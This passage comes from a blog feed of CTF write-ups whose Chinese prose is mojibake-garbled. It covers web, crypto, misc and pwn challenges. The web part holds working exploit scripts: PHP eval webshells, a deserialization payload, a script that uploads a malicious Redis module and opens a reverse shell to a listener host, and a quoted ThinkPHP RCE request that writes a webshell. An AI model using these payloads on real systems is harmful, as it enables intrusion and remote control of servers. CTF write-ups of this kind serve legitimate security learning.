class="string">&quot;&lt;?php eval($_REQUEST[\&quot;cmd\&quot;]); ?&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>, data=payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Refreshing session...&quot;</span>)</span><br><span class="line"></span><br><span class="line">sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php?page=me.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;echo system(&#x27;cat /flag*&#x27;);&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: <span class="string">f&quot;../../../../../../<span class="subst">&#123;session_path&#125;</span>/sess_<span class="subst">&#123;session_id&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = sess.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/index.php&quot;</span>, params=params)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Getting flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Expresssssss"><a href="#Expresssssss" class="headerlink" title="Expresssssss"></a>Expresssssss</h3><p>ä¸‹è½½é™„ä»¶ è™½ç„¶çœ‹æ ·å­æ˜¯ä½¿ç”¨äº†éå¯¹ç§°å¯†é’¥ä½“åˆ¶å®ç° JWTï¼Œä½†å¾ˆæ˜æ˜¾ï¼Œç®—æ³•é€‰é”™äº† </p><p><img src="https://i.loli.net/2021/10/06/Hlo7amCxiwuWSdJ.png" alt="image.png"></p><p>éå¯¹ç§°ä½“åˆ¶åº”å½“ä½¿ç”¨ <code>RS256</code>è€Œé<code>HS256</code>ï¼Œæ˜¯ä¸€ä¸ªå¾ˆä¸¥é‡çš„é”™è¯¯é…ç½®ï¼Œæˆ‘ä»¬ç»§ç»­å¾€åçœ‹</p><p><img src="https://i.loli.net/2021/10/06/h7gMXG5djwOSJae.png" alt="image.png"></p><p>serverConfig åœ¨ä¸Šæ–‡æ˜¯ç©ºçš„ï¼Œè€Œè¿™é‡Œéœ€è¦serverConfig.isOpen ä¸º <code>true</code>ï¼Œå†åŠ ä¸Šä¸Šé¢çš„æºç æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ<code>merge</code>æ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/10/06/YWhMjKirytQJfkO.png" alt="image.png"></p><p>çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„ cookie å‘ç° PK ä»¥åŠå‘è¿‡æ¥äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ª PK é€šè¿‡ <code>HS256</code>è‡ªå·±ç­¾å‘ JWT è¿›å…¥ <code>/admin</code></p><p>è¿™æ ·æˆ‘ä»¬ä¸å¦¨æ„é€ åŸå‹æ±¡æŸ“</p><p><img src="https://i.loli.net/2021/10/06/shDbwWGMNOR467L.png" alt="image.png"></p><p>æ›¿æ¢æ‰cookie</p><p><img src="https://i.loli.net/2021/10/06/CzuMFya3OnB9rmd.png" alt="image.png"></p><h3 id="Happy-PHP"><a href="#Happy-PHP" class="headerlink" title="Happy PHP"></a>Happy PHP</h3><p><img src="https://i.loli.net/2021/10/06/iucs6BIWmXj38ft.png" alt="image.png"></p><p>è¿™é‡Œéœ€è¦æ„é€ ååºåˆ—åŒ–</p><p>ä½†è¿™é‡Œå¯¹å¯¹åº”çš„å­—æ®µè¿›è¡Œäº†éªŒè¯ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æ”¹æ•°é‡ç»•è¿‡<code>__wakeup()</code>ï¼Œå¯ä»¥æ”¹å˜å¯¹è±¡çš„å¤§å°å†™æ¥ç»•è¿‡æ£€æµ‹ã€‚</p><p><code>x=O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&amp;code=echo%20123;</code></p><p>å¯ä»¥çœ‹åˆ°å›æ˜¾</p><p><img src="https://i.loli.net/2021/10/06/EpSvrKDTejP2aLw.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/06/wZlgxsEUASqjuer.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/06/U3LxMngYrjhEAVa.png" alt="image.png"></p><p><code>open_base_dir</code>å’Œ<code>disable_functions</code>éƒ½ç»™é™åˆ¶æ­»äº†</p><p>çœ‹ä¸€ä¸‹å½“å‰ç›®å½•å§</p><p><img src="https://i.loli.net/2021/10/06/u97pJGHFmR38lXa.png" alt="image.png"></p><p>æœ‰ä¸ª<code>.config.swp.php</code></p><p>æŠŠæ–‡ä»¶æ‹–ä¸‹æ¥ï¼Œvim æ¢å¤ä¸‹ å¾—åˆ° mysql ä¸ redis å‡­æ®ï¼Œè¯•äº†ä¸‹ redis è²Œä¼¼å¥½ä½¿ã€‚ä½†è²Œä¼¼æ²¡æ³•å†™æ–‡ä»¶ã€‚</p><p><img src="https://i.loli.net/2021/10/06/XifLGMKtxJFP3wy.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸å¦¨çœ‹çœ‹è¿™ä¸ª redis æ˜¯å¦èƒ½å¤Ÿè½½å…¥æ¶æ„ moduleã€‚è¿™é‡Œä½¿ç”¨äº† <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p>å°†å…¶å†™å…¥ <code>/tmp</code>ç›®å½•ï¼Œç„¶åç™»å½•åˆ° redis è½½å…¥ åå¼¹ shell åˆ°æœåŠ¡å™¨</p><p>ç¼–å†™ EXP</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://152.136.99.28:30108&quot;</span></span><br><span class="line"></span><br><span class="line">redis_rce_mod = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">l_host = <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line"></span><br><span class="line">l_port = <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">code, additional=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>: <span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;eval($_REQUEST[&quot;code&quot;]);&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;code&quot;</span>: code,</span><br><span class="line">        <span class="string">&quot;additional&quot;</span>: additional</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(target, data=payload)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code != <span class="number">200</span>):</span><br><span class="line">        <span class="keyword">raise</span> Exception(r.text)</span><br><span class="line">    <span class="keyword">return</span> r.text[<span class="number">132</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;module.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    redis_rce_mod = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rce(<span class="string">&quot;echo &#x27;Sparta_EN&#x27;;&quot;</span>) == <span class="string">&quot;Sparta_EN&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;[*] RCE confirmed!&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Uploading malicious redis module...&quot;</span>)</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;file_put_contents(&#x27;/tmp/module.so&#x27;, base64_decode($_REQUEST[&#x27;additional&#x27;]));&quot;</span>, base64.b64encode(</span><br><span class="line">    redis_rce_mod).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rce(<span class="string">&quot;chmod(&#x27;/tmp/module.so&#x27;, 0777);&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Trying to trick redis load module and get a reverse shell...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">revershell_payload = <span class="string">f&quot;&quot;&quot;set_time_limit(0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$socket = socket_create(AF_INET, SOCK_STREAM, 0);</span></span><br><span class="line"><span class="string">socket_connect($socket, &quot;127.0.0.1&quot;, 6379);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$payload1 = &quot;*1\r\n$7\r\nCOMMAND\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload2 = &quot;*2\r\n$4\r\nauth\r\n$26\r\nhehe_redis_goes_brrrrrrrrr\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload3 = &quot;*3\r\n$6\r\nmodule\r\n$4\r\nload\r\n$14\r\n/tmp/module.so\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload4 = &quot;*3\r\n$10\r\nsystem.rev\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_host)&#125;</span>\r\n<span class="subst">&#123;l_host&#125;</span>\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_port)&#125;</span>\r\n<span class="subst">&#123;l_port&#125;</span>\r\n&quot;;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload1, strlen($payload1));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload2, strlen($payload2));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload3, strlen($payload3));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload4, strlen($payload4));</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(rce(revershell_payload))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Check your nc!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/06/Kx6eHQkbVXG7Yy1.png" alt="image.png"></p><p><code>cat /flag</code>å‘ç°æ²¡æƒé™ï¼Œè€Œä¹‹å‰æœ‰ä¸ªè®°å½• payload çš„å‡½æ•°æœ‰æç¤ºæˆ‘ä»¬ä½¿ç”¨ readlog æŸ¥çœ‹è®°å½•ã€‚</p><p>çœ‹ä¸‹ binary</p><p><img src="https://i.loli.net/2021/10/06/PUHOfbaoTFte3M1.png" alt="image.png"></p><p>æ˜¯ä¸ª setuid</p><p>ä¸å¦¨æ‰§è¡Œä¸‹ å‘ç°å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œè¯»å‡º flag</p><p><img src="https://i.loli.net/2021/10/06/W4gTGpZsIqk2odc.png" alt="image.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EZ-Crypto"><a href="#EZ-Crypto" class="headerlink" title="EZ Crypto"></a>EZ Crypto</h3><p>ä»¿å°„å¯†ç </p><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">    gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    gcd, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># modular inverse does not exist</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    C = (a*P + b) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>]) % <span class="number">26</span>)</span><br><span class="line">                        + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    P = (a^-1 * (C - b)) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((modinv(key[<span class="number">0</span>], <span class="number">26</span>)*(<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - key[<span class="number">1</span>]))</span><br><span class="line">                         % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = [<span class="number">17</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;EKZZJKZZYUBBAHK&quot;</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;decrypt(c, key)&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;WELLHELLOAFFINE&#125;</code></p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><p>CtfRsaTool ä¸€æŠŠæ¢­ <code>comfact_cn</code>å¯å‡º</p><p>ç”±äº m ä¸­åŒ…å«äº† p é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ æ±‚ c ä¸ n çš„æœ€å¤§å…¬çº¦æ•°æ±‚å‡º q</p><p>åé¢æŒ‰ç…§æ ‡å‡†æµç¨‹è§£å¯†å°±å¥½äº†</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">13099786225848114426288735042622063709429417979653559902255130110659975926568234663676756524835204106945448519122951053919052978834452790083656081239724399724465813907281626036733220108031627090004400217055377991780064228481074731242267303495888888602962900043528353166689119375820829095012486469286192640858709120034967539197423507664888963829638473265043059180698438334763097949285344221617697610851153154943002108316864408271636493080517356530114745146546897588878707507824683476104289624176537904920121831095000551916845112223416432133409395056783383953717096046196532887274225485656111146665584317804803318338909</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">8559655499265896361118223899353477299042241757209602984255991793623671902400849937041183417595204298397177450326134011299326668532961582184674623363025538600270072707047163533208789053017456849333485228029982885219677656015050632558654985633574879301710404077674861745881754178023445783080693280818480184811356779954303543761230708350552871210348291625654157493398915163250634555513484314769991628473845225469274037082850635228850870120629706273968570480643866051827420679768935556198892958086984241175115383476535497399981543828236629739929537486115788597861436866044189520462578886229791185703549894677979975800817</span></span><br><span class="line"></span><br><span class="line">p = GCD(n, c)</span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">m = M // <span class="number">114514</span> // p</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;f299e536-71df-2a9c-4189-1541f4724e2b&#125;</code></p><h3 id="æˆ‘å¤§Eäº†"><a href="#æˆ‘å¤§Eäº†" class="headerlink" title="æˆ‘å¤§Eäº†"></a>æˆ‘å¤§Eäº†</h3><p>è¿™é‡Œçœ‹åˆ°çš„ e éå¸¸å¤§ï¼Œå¯ä»¥ä½¿ç”¨ <code>wiener</code>æ±‚d <a href="https://github.com/orisano/owienerï¼Œæœ‰äº†d">https://github.com/orisano/owienerï¼Œæœ‰äº†d</a>, n e2æˆ‘ä»¬å°±èƒ½æ±‚å‡º p, q å†å¾€åå°±èƒ½å¯ä»¥æ ¹æ® RSA çš„æ ‡å‡†æµç¨‹å¤„ç†è§£å¯†äº†</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes, GCD</span><br><span class="line"><span class="keyword">import</span> wiener</span><br><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/orisano/owiener</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x10001</span></span><br><span class="line">e2 = <span class="number">30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599</span></span><br><span class="line">n = <span class="number">109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span></span><br><span class="line">c1 = <span class="number">71583783682021619717999479268651786751161610363987881699058479972417097127681864247477848165312443269552261650281395262160728715862254920244393628296570316218768130014057719355479608374320909554953446063226545440801131248900137089609895608341522946793200814556574254250659621793341199431483521650853287065268462347854129303033847182723629092195909957117089056444411650802573134427914604925772044236086815457154819679424034812539639758661460317397185002960311032637913793371456665287379240275667317336526891584182621458450580573412613408361770289740079739848770272206592041842234862740865747628519852066267368160881640</span></span><br><span class="line">c2 = <span class="number">55494113780323304422454443648470010911900254740052633133363579960778021288760719271727939446265317907324037593785145992975447677054351886369334354944686849950347151902030735393458784973074467509096895699845403768218581207266475016330668907743203265620833738555574220981953741412558878717721926421279776436821288860990364711094386574370156520178658536435862325596193413858200565399019959529641748661306266278353593276972984410712399939855516008418931398046437081154108451462740956025357863828658378552113064369320441912407668462443383302645820142910970079821181611519951712237177739140891042508920500678667417508093499</span></span><br><span class="line"></span><br><span class="line">d2 = wiener.attack(e2, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/ius/rsatool/blob/master/rsatool.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span>(<span class="params">n, d, e</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        quotient, remainder = <span class="built_in">divmod</span>(t, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i-<span class="number">1</span>, n) * t, n)</span><br><span class="line">            c2 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"></span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (-<span class="number">1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># p = fractions.gcd(c1-1, n)</span></span><br><span class="line">    p = GCD(c1-<span class="number">1</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = factor_modulus(n, d2, e2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = inverse(e1, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1, d1, n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><code>flag&#123;14c78aaf-9221-1899-3a7f-0f287f3f6790&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="EZ-Traffic"><a href="#EZ-Traffic" class="headerlink" title="EZ Traffic"></a>EZ Traffic</h3><p>æµé‡å®¡è®¡</p><p><img src="https://i.loli.net/2021/10/06/R64rmEy1WZbNAes.png" alt="image.png"></p><p>å…ˆçœ‹ä¸‹ç»Ÿè®¡ HTTP åå¤š, é‚£å°±çœ‹çœ‹ HTTP æœåŠ¡</p><p>çœ‹ä¸‹ HTTP</p><p><img src="https://i.loli.net/2021/10/06/foxFKILSE5WJTZN.png" alt="image.png"></p><p>è¿™å‡ ä¸ª traffic è›®å¯ç–‘çš„</p><p><img src="https://i.loli.net/2021/10/06/TirEoF2bjepLSB5.png" alt="image.png"></p><p>è¿˜æœ‰ä¸€ä¸ª <code>flag.zip</code></p><p>æˆ‘ä»¬ä¸å¦¨å…ˆæŠŠè¿™ä¸ªæ–‡ä»¶è§£å‡ºæ¥ å‘ç°æœ‰å¯†ç  å°±ç»§ç»­å¾€ä¸Šçœ‹</p><p><code>config.php?cmd=xxxx</code>æ¯”è¾ƒå¯ç–‘ base64 è§£ç åçœ‹ä¸åˆ°å†…å®¹ é‚£å°±ç»§ç»­å¾€ä¸Šçœ‹</p><blockquote><p>GET /?s=index%7Cthink%5Capp%2Finvokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=file_put_contents&amp;vars%5B1%5D%5B0%5D=config.php&amp;vars%5B1%5D%5B1%5D=%3C%3Fphp+eval%28gzinflate%28base64_decode%28%24_REQUEST%5B%22cmd%22%5D%29%29%29%3B+%3F%3E HTTP/1.1<br>Host: 47.100.41.68<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Connection: keep-alive</p></blockquote><p>å‘ç°è¿™é‡Œå†™äº†ä¸€ä¸ª <code>config.php</code> çš„é©¬ å†…å®¹ä¸º <code>&lt;?php eval(gzinflate(base64_decode($_REQUEST[&#39;cmd&#39;])));</code></p><p>æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª gzinflate</p><p>ä¸‹é¢çœ‹ response éƒ¨åˆ† å‘ç° åŒ… 3214 æœ‰è¿”å› zip çš„ç»“æœ æˆ‘ä»¬ç»™ä»–çš„ request è§£å¯†</p><p><code>echo system(&quot;zip --password K5bi8UgMNGC97QhPHgpRrrWtYZYkoe7C flag.zip /flag&quot;);</code></p><p>è§£å‹å¾— flag</p><p><img src="https://i.loli.net/2021/10/06/osuF7vlwx3UMLjI.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-Sept-X-æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›wp</title>
      <link href="2021/09/25/DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>2021/09/25/DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>æ„Ÿè°¢é›ªå®å¸¦é£ï¼ŒèŠ±äº†ä¸€å¤©æ—¶é—´ç»ˆäºakäº†pwn</p><h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p>ç­¾åˆ°é¢˜ç½¢äº†</p><p>strdupå‡½æ•°æºç å¦‚ä¸‹ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut5vt0f17j61620saadq02.jpg" alt=""></p><p>å¯ä»¥çœ‹åˆ°strdupå¤åˆ¶æ•°æ®çš„æ—¶å€™ä¼šè°ƒç”¨strlenå‡½æ•°ï¼Œé‚£ä¹ˆreadæ˜¯ä¸ä¼šåœ¨å­—ç¬¦ä¸²åé¢è¡¥00å­—èŠ‚çš„ï¼Œæ‰€ä»¥ä¼šæ³„éœ²å‡ºæ ˆåœ°å€</p><p>ç„¶åå› ä¸ºæ²¡æœ‰å¼€NXä¿æŠ¤ï¼Œæ‰€ä»¥å¯æ‰§è¡Œshellcodeï¼Œshellcodeä¸€æŠŠæ¢­å°±å®Œäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./bypwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge, &#x27;b 0x40082d&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span 